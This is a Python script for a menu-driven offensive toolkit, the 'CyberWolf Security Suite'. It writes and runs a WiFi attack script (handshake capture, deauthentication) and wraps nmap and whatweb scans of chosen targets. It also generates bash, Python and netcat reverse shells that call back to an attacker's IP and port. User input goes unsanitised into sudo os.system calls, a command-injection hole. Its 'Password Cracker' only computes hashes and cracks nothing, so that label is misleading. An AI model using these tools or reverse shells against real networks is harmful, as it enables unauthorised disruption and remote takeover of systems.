#!/usr/bin/env python3
import os
import sys

def clear_screen():
    os.system('clear')

def show_banner():
    print("""
╔════════════════════════════════════════════════════════════════╗
║              🐺 CYBERWOLF SECURITY SUITE 🐺                    ║
║           The Wolf Watches. The Wolf Protects.                 ║
╚════════════════════════════════════════════════════════════════╝
    """)

def wifi_tool():
    print("\n🤖 Launching AI WiFi Pentester...")
    wifi_path = os.path.expanduser("~/AI-WiFi-Pentester/ai_wifi_pentester.py")
    
    if os.path.exists(wifi_path):
        os.system(f"sudo python3 {wifi_path}")
    else:
        print("📡 Creating WiFi Pentester...")
        os.makedirs(os.path.expanduser("~/AI-WiFi-Pentester"), exist_ok=True)
        
        with open(wifi_path, 'w') as f:
            f.write('#!/usr/bin/env python3\n')
            f.write('import os\n')
            f.write('print("\\n🐺 CYBERWOLF WIFI PENTESTER\\n")\n')
            f.write('print("1. Scan Networks")\n')
            f.write('print("2. Capture Handshake")\n')
            f.write('print("3. Deauth Attack\\n")\n')
            f.write('choice = input("Choice: ")\n')
            f.write('if choice == "1":\n')
            f.write('    os.system("sudo airmon-ng start wlan0 2>/dev/null")\n')
            f.write('    os.system("sudo timeout 30 airodump-ng wlan0mon")\n')
            f.write('elif choice == "2":\n')
            f.write('    bssid = input("BSSID: ")\n')
            f.write('    ch = input("Channel: ")\n')
            f.write('    os.system(f"sudo airodump-ng -c {ch} --bssid {bssid} -w capture wlan0mon")\n')
            f.write('elif choice == "3":\n')
            f.write('    bssid = input("BSSID: ")\n')
            f.write('    os.system(f"sudo aireplay-ng -0 5 -a {bssid} wlan0mon")\n')
            f.write('print("\\n🐺 Done!")\n')
        
        os.chmod(wifi_path, 0o755)
        os.system(f"sudo python3 {wifi_path}")

def network_scanner():
    print("\n🔍 Network Scanner")
    target = input("Target IP: ")
    os.system(f"nmap -sV --top-ports 50 {target}")

def web_scanner():
    print("\n🌐 Web Scanner")
    url = input("Target URL: ")
    os.system(f"whatweb {url}")

def password_tool():
    print("\n🔐 Password Cracker")
    print("1. MD5 Hash")
    print("2. SHA1 Hash")
    print("3. SHA256 Hash")
    choice = input("Choice: ")
    
    import hashlib
    hash_input = input("Enter hash or text: ")
    
    if choice == '1':
        result = hashlib.md5(hash_input.encode()).hexdigest()
        print(f"MD5: {result}")
    elif choice == '2':
        result = hashlib.sha1(hash_input.encode()).hexdigest()
        print(f"SHA1: {result}")
    elif choice == '3':
        result = hashlib.sha256(hash_input.encode()).hexdigest()
        print(f"SHA256: {result}")

def shell_generator():
    print("\n💀 Reverse Shell Generator")
    lhost = input("Your IP: ")
    lport = input("Your Port: ")
    
    print(f"\nBash: bash -i >& /dev/tcp/{lhost}/{lport} 0>&1")
    print(f"\nPython: python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'")
    print(f"\nNetcat: nc -e /bin/sh {lhost} {lport}")
    print(f"\nListener: nc -lvnp {lport}")

def main():
    while True:
        clear_screen()
        show_banner()
        
        print("🐺 MAIN MENU\n")
        print("  1. 📡 AI WiFi Pentester")
        print("  2. 🔍 Network Scanner")
        print("  3. 🌐 Web Scanner")
        print("  4. 🔐 Password Tools")
        print("  5. 💀 Reverse Shell")
        print("  6. 🚪 Exit\n")
        
        choice = input("🐺 Select tool (1-6): ")
        
        if choice == '1':
            wifi_tool()
        elif choice == '2':
            network_scanner()
        elif choice == '3':
            web_scanner()
        elif choice == '4':
            password_tool()
        elif choice == '5':
            shell_generator()
        elif choice == '6':
            print("\n🐺 The Wolf Watches. The Wolf Protects.")
            print("   Stay secure! 🔒\n")
            break
        else:
            print("\n❌ Invalid choice!")
        
        input("\n🐺 Press Enter to continue...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n🐺 Interrupted. Goodbye!")
    except Exception as e:
        print(f"Error: {e}")
